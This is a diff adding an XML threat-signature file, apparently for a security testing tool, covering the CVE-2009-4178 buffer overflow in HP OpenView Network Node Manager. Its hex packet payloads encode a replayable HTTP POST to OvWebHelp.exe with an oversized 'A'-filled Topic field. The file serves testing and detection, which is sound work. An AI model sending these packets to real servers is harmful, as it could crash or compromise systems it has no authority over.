@@ -1,0 +1,83 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="HP OpenView Network Node Manager OvWebHelp.exe Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in HP OpenView Network Node Manager (NNM). The vulnerability is due to a boundary error when the CGI program OvWebHelp.exe processes the Topic variable in an HTTP POST request. A remote unauthenticated attacker can exploit this vulnerability by sending a crafted HTTP POST request to a target server, potentially causing arbitrary code to be injected and executed in the security context of the Internet Guest account. In an attack scenario, where arbitrary code is injected and executed on the target machine, the behaviour of the target is dependent on the logic of the malicious code."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="HP"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="HP_OpenView_Network_Node_Manager"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="HP_OpenView_Network_Node_Manager_7.01&amp;7.51&amp;7.53"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-4178"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="58a2a21704cf11cabfd71becec8b4512"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633972729466822551"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1261564247" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="N"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="O"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="E">
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:49:FD:DB" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="05DC" Identification="3256" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="A16A" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="36584" destPort="$HTTPdestPort" SeqNumber="CEC41800" AckNumber="7B6FC609" HeaderLength="08" WindowSize="002E" Checksum="3BE7" UrgentPointer="0000" Options="0101080AC6B025AC00000000" Payload="504F5354202F4F764367692F4F7657656248656C702E65786520485454502F312E300D0A436F6E74656E742D4C656E6774683A20313534320D0A0D0A546F7069633D4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="E" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:49:FD:DB" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00CE" Identification="3257" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="A677" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="36584" destPort="$HTTPdestPort" SeqNumber="CEC41DA8" AckNumber="7B6FC609" HeaderLength="08" WindowSize="002E" Checksum="CA75" UrgentPointer="0000" Options="0101080AC6B025AC00000000" Payload="41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
